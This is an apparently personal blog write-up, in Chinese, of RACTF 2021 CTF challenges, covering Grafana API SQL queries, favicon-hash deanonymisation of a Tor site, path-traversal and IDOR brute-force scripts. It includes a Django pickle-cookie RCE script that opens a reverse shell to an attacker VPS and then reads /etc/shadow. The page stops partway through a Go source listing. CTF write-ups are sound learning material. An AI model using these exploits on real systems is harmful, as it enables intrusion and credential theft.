@@ -1,0 +1,517 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>AmiaaaZ's Site | RACTF2021 Wp</title>
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=generator content="Hugo 0.87.0">
+<meta name=ROBOTS content="INDEX, FOLLOW">
+<link href=/dist/app.css rel=stylesheet>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
+<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
+<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
+<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
+</head>
+<body class="bg-gray-100 text-gray-700 font-sans">
+<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
+<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
+<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
+<div>
+<h2>
+<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
+</h2>
+</div>
+<h1 class=pt-2>RACTF2021 Wp</h1>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">难啊难啊，基本都是赛后复现</h3>
+<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
+<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
+&nbsp;&nbsp;
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-08-18T17:07:55+08:00>2021-8-18 17:07</time>
+</div>
+<details class=toc open>
+<summary>
+<hr>
+</summary>
+<div class="inline toc-content">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#webreally-awesome-monitoring-dashboard>Web/Really Awesome Monitoring Dashboard</a></li>
+<li><a href=#webreally-awesome-hidden-service>Web/Really Awesome Hidden Service</a></li>
+<li><a href=#webemojibook>Web/Emojibook</a></li>
+<li><a href=#webemojybook-2>Web/Emojybook 2</a></li>
+<li><a href=#webmilitary-grade>Web/Military Grade</a></li>
+<li><a href=#websecret-store>Web/Secret Store</a></li>
+<li><a href=#webim-a-fun>Web/I&rsquo;m a fun</a></li>
+<li><a href=#osinttriangles>OSINT/Triangles</a></li>
+<li><a href=#miscellaneousdiscord>Miscellaneous/Discord</a></li>
+<li><a href=#miscellaneousmissing-tools>Miscellaneous/Missing Tools</a></li>
+</ul>
+</nav>
+</div>
+</details>
+<hr>
+</div>
+</header>
+<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+<article>
+<section class="mx-auto content">
+<div class=c-rich-text><p><a href=https://github.com/ractf/challenges/tree/master/2021>https://github.com/ractf/challenges/tree/master/2021</a></p>
+<p><a href=https://github.com/404dcd/RACTF-challenges>https://github.com/404dcd/RACTF-challenges</a></p>
+<p><a href=https://blog.ractf.co.uk/tag/ractf-2021/>https://blog.ractf.co.uk/tag/ractf-2021/</a></p>
+<h2 id=webreally-awesome-monitoring-dashboard>Web/Really Awesome Monitoring Dashboard</h2>
+<blockquote>
+<p>🌟 Perfect infrastructure 🌟</p>
+</blockquote>
+<p>是grafana</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005221430.png alt=image-20210818005221430></p>
+<p>但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png alt=image-20210818005705121></p>
+<p>那这就好说了，直接明牌了都</p>
+<pre><code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
+SELECT * FROM flags;
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png alt=image-20210818011913101></p>
+<p>————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息</p>
+<h2 id=webreally-awesome-hidden-service>Web/Really Awesome Hidden Service</h2>
+<blockquote>
+<p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.</p>
+<pre><code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
+</code></pre></blockquote>
+<p>一个Tor的网站，走匿名方式</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png alt=image-20210818014430572></p>
+<p>那首先要把隐藏在后面的真实ip给找出来。整个网页的内容没有什么特别的，但是通常容易被忽略的是favicon图像，这里可以参考这样一篇文章：<a href=https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/>Hunting phishing websites with favicon hashes</a></p>
+<p>这里可以用<a href=https://github.com/pielco11/fav-up>fav-up</a>一把梭（也就是自动化了提取图标->计算mmhash值->shodan搜索出ip这个过程），得到ip为<code>178.62.4.214|178.62.15.164</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818021746841.png alt=image-20210818021746841></p>
+<p><code>ractf{DreadingPirates}</code></p>
+<p>————除此之外还有一个非预期解，当用非法的host header请求时，会直接返回flag</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -s --socks5-hostname localhost:9050 -H <span style=color:#d88200>&#34;Host: asd.com&#34;</span> ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion <span style=color:#111>|</span> grep <span style=color:#d88200>&#34;ractf&#34;</span>
+</code></pre></div><p><em>All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.</em></p>
+<h2 id=webemojibook>Web/Emojibook</h2>
+<blockquote>
+<p><img src=https://b.thumbs.redditmedia.com/4z_KB1qtCsTjcUqxDTbVIpJlR-AMzqrPeZDIz7VKdko.png alt=img></p>
+<p>The flag is at <code>/flag.txt</code></p>
+</blockquote>
+<p>可以登录、注册账户、发布note、查看，给出了源码</p>
+<p>看源码，是django框架的后端，直奔settings.py</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815135148402.png alt=image-20210815135148402></p>
+<p>看到了熟悉的pickle</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815145254055.png alt=image-20210815145254055></p>
+<p>在仅有的这个app的view.py中有这样的代码，会在note的body部分匹配<code>{{.*?}}</code>这样的内容并将其中的部分拼接到/emoji/后以image的形式加载出来，但是直接用{{/flag.txt}}是不可以的，这部分代码在forms.py中</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818031453613.png alt=image-20210818031453613></p>
+<p>所以最终的payload是 <code>{..{/flag.txt}..}</code></p>
+<p><code>ractf{dj4ng0_lfi}</code></p>
+<p>————然而这里有个非预期，url部分可以直接修改note编号达到水平越权，也就是说可以通过爆破方式找到之前已经成功的note</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>logging</span>
+<span style=color:#f92672>import</span> <span style=color:#111>threading</span>
+<span style=color:#f92672>import</span> <span style=color:#111>time</span>
+<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>thread_function</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+      <span style=color:#111>r</span><span style=color:#f92672>=</span><span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://193.57.159.27:30160/&#34;</span><span style=color:#f92672>+</span><span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#111>))</span>
+      <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#d88200>&#34;base64&#34;</span> <span style=color:#f92672>in</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span> <span style=color:#f92672>and</span> <span style=color:#d88200>&#34;cmFjdGZ7&#34;</span> <span style=color:#f92672>in</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>):</span>
+        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>pass</span>
+
+<span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
+    <span style=color:#111>threads</span> <span style=color:#f92672>=</span> <span style=color:#111>list</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>index</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>1000</span><span style=color:#111>):</span>
+        <span style=color:#111>x</span> <span style=color:#f92672>=</span> <span style=color:#111>threading</span><span style=color:#f92672>.</span><span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>thread_function</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#f92672>=</span><span style=color:#111>(</span><span style=color:#111>index</span><span style=color:#111>,))</span>
+        <span style=color:#111>threads</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>x</span><span style=color:#111>)</span>
+        <span style=color:#111>x</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>index</span><span style=color:#111>,</span> <span style=color:#111>thread</span> <span style=color:#f92672>in</span> <span style=color:#111>enumerate</span><span style=color:#111>(</span><span style=color:#111>threads</span><span style=color:#111>):</span>
+        <span style=color:#111>thread</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>()</span>
+</code></pre></div><h2 id=webemojybook-2>Web/Emojybook 2</h2>
+<blockquote>
+<p>no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile</p>
+<p>The flag is at <code>/flag.txt</code></p>
+</blockquote>
+<p>跟上面那个前端一模一样，然而这次再用之前的 <code>{..{/flag.txt}..}</code>会返回500错误，这回就要用上之前完全没用到的pickle session cookie了。</p>
+<p>先读一下/app/notebook/settings.py，得到secret_key，然后搞一个反弹shell的cookie出来</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</span>
+<span style=color:#75715e>#!/usr/bin/python</span>
+<span style=color:#f92672>import</span> <span style=color:#111>django.core.signing</span><span style=color:#f92672>,</span> <span style=color:#111>django.contrib.sessions.serializers</span>
+<span style=color:#f92672>from</span> <span style=color:#111>django.http</span> <span style=color:#f92672>import</span> <span style=color:#111>HttpResponse</span>
+<span style=color:#f92672>from</span> <span style=color:#111>django.conf</span> <span style=color:#f92672>import</span> <span style=color:#111>settings</span>
+<span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
+<span style=color:#f92672>import</span> <span style=color:#111>os</span>
+<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+
+<span style=color:#111>SECRET_KEY</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7&#34;(S3xv,{sp)Xaqg?2pj2=hFCgN&#34;CR&#34;UPn4&#39;</span>
+
+<span style=color:#111>settings</span><span style=color:#f92672>.</span><span style=color:#111>configure</span><span style=color:#111>(</span><span style=color:#111>DEFAULT_HASHING_ALGORITHM</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;sha256&#34;</span><span style=color:#111>)</span>
+
+<span style=color:#75715e># Initial cookie when visiting the page</span>
+<span style=color:#111>cookie</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM&#34;</span>
+
+<span style=color:#111>newContent</span> <span style=color:#f92672>=</span>  <span style=color:#111>django</span><span style=color:#f92672>.</span><span style=color:#111>core</span><span style=color:#f92672>.</span><span style=color:#111>signing</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>cookie</span><span style=color:#111>,</span><span style=color:#111>key</span><span style=color:#f92672>=</span><span style=color:#111>SECRET_KEY</span><span style=color:#111>,</span><span style=color:#111>serializer</span><span style=color:#f92672>=</span><span style=color:#111>django</span><span style=color:#f92672>.</span><span style=color:#111>contrib</span><span style=color:#f92672>.</span><span style=color:#111>sessions</span><span style=color:#f92672>.</span><span style=color:#111>serializers</span><span style=color:#f92672>.</span><span style=color:#111>PickleSerializer</span><span style=color:#111>,</span><span style=color:#111>salt</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;django.contrib.sessions.backends.signed_cookies&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>PickleRce</span><span style=color:#111>(</span><span style=color:#111>object</span><span style=color:#111>):</span>
+	<span style=color:#00a8c8>def</span> <span style=color:#75af00>__reduce__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
+		<span style=color:#f92672>import</span> <span style=color:#111>os</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>,(</span><span style=color:#d88200>&#34;python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>VPS IP</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>/bin/sh</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>)&#39;&#34;</span><span style=color:#111>,))</span>
+
+<span style=color:#111>newContent</span><span style=color:#111>[</span><span style=color:#d88200>&#39;testcookie&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>PickleRce</span><span style=color:#111>()</span>
+
+<span style=color:#111>new_cookie</span> <span style=color:#f92672>=</span> <span style=color:#111>django</span><span style=color:#f92672>.</span><span style=color:#111>core</span><span style=color:#f92672>.</span><span style=color:#111>signing</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>newContent</span><span style=color:#111>,</span><span style=color:#111>key</span><span style=color:#f92672>=</span><span style=color:#111>SECRET_KEY</span><span style=color:#111>,</span><span style=color:#111>serializer</span><span style=color:#f92672>=</span><span style=color:#111>django</span><span style=color:#f92672>.</span><span style=color:#111>contrib</span><span style=color:#f92672>.</span><span style=color:#111>sessions</span><span style=color:#f92672>.</span><span style=color:#111>serializers</span><span style=color:#f92672>.</span><span style=color:#111>PickleSerializer</span><span style=color:#111>,</span><span style=color:#111>salt</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;django.contrib.sessions.backends.signed_cookies&#39;</span><span style=color:#111>,</span><span style=color:#111>compress</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>)</span>
+
+<span style=color:#75715e># We can then make a request with this cookie</span>
+<span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://193.57.159.27:23934/&#34;</span><span style=color:#111>,</span> <span style=color:#111>cookies</span><span style=color:#f92672>=</span><span style=color:#111>{</span>
+	<span style=color:#d88200>&#34;sessionid&#34;</span><span style=color:#111>:</span> <span style=color:#111>new_cookie</span>
+<span style=color:#111>})</span>
+</code></pre></div><p>得到shell之后我们只是个web用户，读/etc/shadow可以i得到admin的hash值，弱口令 是个999999，然后我们就可以<code>su admin</code>，读flag了</p>
+<p><code>ractf{dj4ng0_lfi_rce_not_unintended}</code></p>
+<p>参考：<a href=https://techsupportjosh.com/posts/ractf-emojibook/>wp</a></p>
+<h2 id=webmilitary-grade>Web/Military Grade</h2>
+<blockquote>
+<p>Go is safe, right? That means my implementation of AES will be secure?</p>
+</blockquote>
+<p>给出了go文件</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=color:#f92672>package</span> <span style=color:#75af00>main</span>
+
+<span style=color:#f92672>import</span> <span style=color:#111>(</span>
+	<span style=color:#d88200>&#34;bytes&#34;</span>
+	<span style=color:#d88200>&#34;crypto/aes&#34;</span>
+	<span style=color:#d88200>&#34;crypto/cipher&#34;</span>
+	<span style=color:#d88200>&#34;encoding/hex&#34;</span>
+	<span style=color:#d88200>&#34;fmt&#34;</span>
+	<span style=color:#d88200>&#34;log&#34;</span>
+	<span style=color:#d88200>&#34;math/rand&#34;</span>
+	<span style=color:#d88200>&#34;net/http&#34;</span>
+	<span style=color:#d88200>&#34;sync&#34;</span>
+	<span style=color:#d88200>&#34;time&#34;</span>
+<span style=color:#111>)</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>rawFlag</span> <span style=color:#111>=</span> <span style=color:#d88200>&#34;[REDACTED]&#34;</span>
+
+<span style=color:#00a8c8>var</span> <span style=color:#75af00>flag</span> <span style=color:#00a8c8>string</span>
+<span style=color:#00a8c8>var</span> <span style=color:#75af00>flagmu</span> <span style=color:#75af00>sync</span><span style=color:#111>.</span><span style=color:#75af00>Mutex</span>
+
+<span style=color:#00a8c8>func</span> <span style=color:#75af00>PKCS5Padding</span><span style=color:#111>(</span><span style=color:#75af00>ciphertext</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span><span style=color:#111>,</span> <span style=color:#75af00>blockSize</span> <span style=color:#00a8c8>int</span><span style=color:#111>,</span> <span style=color:#75af00>after</span> <span style=color:#00a8c8>int</span><span style=color:#111>)</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>padding</span> <span style=color:#f92672>:=</span> <span style=color:#111>(</span><span style=color:#75af00>blockSize</span> <span style=color:#f92672>-</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>ciphertext</span><span style=color:#111>)</span><span style=color:#f92672>%</span><span style=color:#75af00>blockSize</span><span style=color:#111>)</span>
+	<span style=color:#75af00>padtext</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>bytes</span><span style=color:#111>.</span><span style=color:#75af00>Repeat</span><span style=color:#111>([]</span><span style=color:#00a8c8>byte</span><span style=color:#111>{</span><span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>padding</span><span style=color:#111>)},</span> <span style=color:#75af00>padding</span><span style=color:#111>)</span>
+	<span style=color:#00a8c8>return</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>ciphertext</span><span style=color:#111>,</span> <span style=color:#75af00>padtext</span><span style=color:#f92672>...</span><span style=color:#111>)</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>func</span> <span style=color:#75af00>encrypt</span><span style=color:#111>(</span><span style=color:#75af00>plaintext</span> <span style=color:#00a8c8>string</span><span style=color:#111>,</span> <span style=color:#75af00>bKey</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span><span style=color:#111>,</span> <span style=color:#75af00>bIV</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span><span style=color:#111>,</span> <span style=color:#75af00>blockSize</span> <span style=color:#00a8c8>int</span><span style=color:#111>)</span> <span style=color:#00a8c8>string</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>bPlaintext</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>PKCS5Padding</span><span style=color:#111>([]</span><span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>plaintext</span><span style=color:#111>),</span> <span style=color:#75af00>blockSize</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>plaintext</span><span style=color:#111>))</span>
+	<span style=color:#75af00>block</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>aes</span><span style=color:#111>.</span><span style=color:#75af00>NewCipher</span><span style=color:#111>(</span><span style=color:#75af00>bKey</span><span style=color:#111>)</span>
+	<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
+		<span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Println</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span>
+		<span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;&#34;</span>
+	<span style=color:#111>}</span>
+	<span style=color:#75af00>ciphertext</span> <span style=color:#f92672>:=</span> <span style=color:#111>make</span><span style=color:#111>([]</span><span style=color:#00a8c8>byte</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>bPlaintext</span><span style=color:#111>))</span>
+	<span style=color:#75af00>mode</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>cipher</span><span style=color:#111>.</span><span style=color:#75af00>NewCBCEncrypter</span><span style=color:#111>(</span><span style=color:#75af00>block</span><span style=color:#111>,</span> <span style=color:#75af00>bIV</span><span style=color:#111>)</span>
+	<span style=color:#75af00>mode</span><span style=color:#111>.</span><span style=color:#75af00>CryptBlocks</span><span style=color:#111>(</span><span style=color:#75af00>ciphertext</span><span style=color:#111>,</span> <span style=color:#75af00>bPlaintext</span><span style=color:#111>)</span>
+	<span style=color:#00a8c8>return</span> <span style=color:#75af00>hex</span><span style=color:#111>.</span><span style=color:#75af00>EncodeToString</span><span style=color:#111>(</span><span style=color:#75af00>ciphertext</span><span style=color:#111>)</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>func</span> <span style=color:#75af00>changer</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>ticker</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>time</span><span style=color:#111>.</span><span style=color:#75af00>NewTicker</span><span style=color:#111>(</span><span style=color:#75af00>time</span><span style=color:#111>.</span><span style=color:#75af00>Millisecond</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>672</span><span style=color:#111>).</span><span style=color:#75af00>C</span>
+	<span style=color:#00a8c8>for</span> <span style=color:#00a8c8>range</span> <span style=color:#75af00>ticker</span> <span style=color:#111>{</span>
+		<span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Seed</span><span style=color:#111>(</span><span style=color:#75af00>time</span><span style=color:#111>.</span><span style=color:#75af00>Now</span><span style=color:#111>().</span><span style=color:#75af00>UnixNano</span><span style=color:#111>()</span> <span style=color:#f92672>&amp;</span> <span style=color:#111>^</span><span style=color:#ae81ff>0x7FFFFFFFFEFFF000</span><span style=color:#111>)</span>
+		<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#111>&lt;</span> <span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span><span style=color:#111>);</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Seed</span><span style=color:#111>(</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Int63</span><span style=color:#111>())</span>
+		<span style=color:#111>}</span>
+
+		<span style=color:#00a8c8>var</span> <span style=color:#75af00>key</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span>
+		<span style=color:#00a8c8>var</span> <span style=color:#75af00>iv</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span>
+
+		<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#111>&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>key</span> <span style=color:#111>=</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>key</span><span style=color:#111>,</span> <span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#ae81ff>255</span><span style=color:#111>)))</span>
+		<span style=color:#111>}</span>
+
+		<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#111>&lt;</span> <span style=color:#75af00>aes</span><span style=color:#111>.</span><span style=color:#75af00>BlockSize</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>iv</span> <span style=color:#111>=</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>iv</span><span style=color:#111>,</span> <span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#ae81ff>255</span><span style=color:#111>)))</span>
+		<span style=color:#111>}</span>
+
+		<span style=color:#75af00>flagmu</span><span style=color:#111>.</span><span style=color:#75af00>Lock</span><span style=color:#111>()</span>
